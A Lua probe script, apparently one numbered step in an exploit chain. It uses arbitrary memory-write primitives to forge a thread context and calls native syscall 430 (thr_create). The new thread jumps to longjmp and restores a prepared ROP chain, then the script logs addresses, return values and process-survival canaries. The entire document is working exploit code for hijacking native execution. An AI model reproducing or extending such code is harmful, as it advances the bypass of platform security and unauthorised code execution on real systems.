-- 76c: native thr_create with a tested longjmp/ROP exit path.
-- This is one bounded call; it does not use the zero-RIP context from 58e.
print("=== PROBE 76c: THR_CREATE SAFE LONGJMP CONTEXT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
print("canary_getpid=" .. tostring(syscall.sc_getpid():tonumber()))

-- Build the same tested chain used by 60j, but do not launch it through libc.
local ok_thr, thr = pcall(function() return thread:new(syscall.sc_getpid) end)
if not ok_thr then
    print("thread_new_failed=" .. tostring(thr))
    print("=== PROBE 76c COMPLETE ===")
    return
end

local ctx = memory.alloc(0x600)
local id_slot = memory.alloc(0x10)
local initial_stack = memory.alloc(0x4000)
zero(ctx, 0x600)
zero(id_slot, 0x10)
zero(initial_stack, 0x4000)

-- Context gates decoded by the remote 58e update.
wq(ctx + 0x108, 0x480)
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, 0x10000)

-- SysV register block: rdi=jmpbuf, rsi=1 for longjmp(jmpbuf, 1).
wq(ctx + 0x48, thr.jmpbuf)
wq(ctx + 0x50, 1)

-- Candidate machine-context fields. The initial stack is only a valid landing
-- stack; longjmp immediately restores the tested ROP stack from jmpbuf.
wq(ctx + 0xE0, initial_stack + 0x3FF0)
wq(ctx + 0xF8, libc_addrofs.longjmp)
wq(ctx + 0x100, 0)

print("ctx=" .. tostring(ctx))
print("id_slot=" .. tostring(id_slot))
print("jmpbuf=" .. tostring(thr.jmpbuf) .. " stack=" .. tostring(thr.chain.stack_base))
print("longjmp=" .. q(libc_addrofs.longjmp))
print("[BEFORE] 430(safe longjmp context)")

local ok_call, rv = pcall(function()
    return (function()
        local sc = {}
        for k, v in pairs(syscall.pipe) do sc[k] = v end
        sc.syscall_no = 430
        setmetatable(sc, getmetatable(syscall.pipe))
        return sc(uint64(ctx), uint64(id_slot), uint64(0))
    end)()
end)

print("[RETURNED] ok=" .. tostring(ok_call) .. " rv=" .. tostring(rv))
local id_ok, id_val = pcall(function() return memory.read_qword(id_slot) end)
if id_ok then print("id_after=" .. q(id_val)) end
local alive_ok, alive = pcall(function() return syscall.sc_getpid():tonumber() end)
print("post_canary_ok=" .. tostring(alive_ok) .. " pid=" .. tostring(alive))
local ret_addr = thr.chain:get_last_retval_addr()
if ret_addr then
    local ret_ok, ret_val = pcall(function() return memory.read_qword(ret_addr) end)
    print("child_chain_retval_ok=" .. tostring(ret_ok) .. " value=" .. (ret_ok and q(ret_val) or "<unreadable>"))
else
    print("child_chain_retval_addr=<none>")
end
print("=== PROBE 76c COMPLETE ===")
